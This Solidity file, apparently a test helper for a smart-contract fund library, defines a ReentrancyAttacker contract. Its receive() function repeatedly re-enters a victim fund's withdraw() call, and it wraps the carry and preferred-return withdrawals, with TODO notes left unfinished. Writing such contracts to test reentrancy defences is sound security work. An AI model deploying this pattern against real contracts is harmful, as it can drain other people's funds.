// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@massless.io/smart-contract-library/admin/AdminPermission.sol";
import "@massless.io/smart-contract-library/funding/extension/IERC20PreferredReturn.sol";
import "@massless.io/smart-contract-library/funding/extension/IERC20Carry.sol";
import "@massless.io/smart-contract-library/funding/IFund.sol";

contract ReentrancyAttacker is AdminPermission {
    address public victimAddress;
    uint256 public attackCount;

    event ReentrancyAttackSuccess();

    receive() external payable {
        attackCount++;
        emit ReentrancyAttackSuccess();
        if (attackCount < 10) {
            attackWithdraw();
            // TODO: Not sure how to call attackWithdrawPre
            // TODO: Not sure how to call attackWithdrawCarry
        }
    }

    constructor(address victimAddress_) AdminPermission(msg.sender) {
        victimAddress = victimAddress_;
    }

    function attackWithdrawCarry(
        bytes32 merkleRoot_,
        bytes32[] calldata merkleProof_,
        uint256 tokenAmount_
    ) public onlyAdmin {
        IERC20Carry(victimAddress).withdrawCarry(
            merkleRoot_,
            merkleProof_,
            tokenAmount_
        );
    }

    function attackWithdrawPre(
        bytes32[] calldata merkleProof_,
        uint256 tokenAmount_
    ) public onlyAdmin {
        IERC20PreferredReturn(victimAddress).withdrawPref(
            merkleProof_,
            tokenAmount_
        );
    }

    function attackWithdraw() public onlyAdmin {
        IFund(victimAddress).withdraw();
    }
}
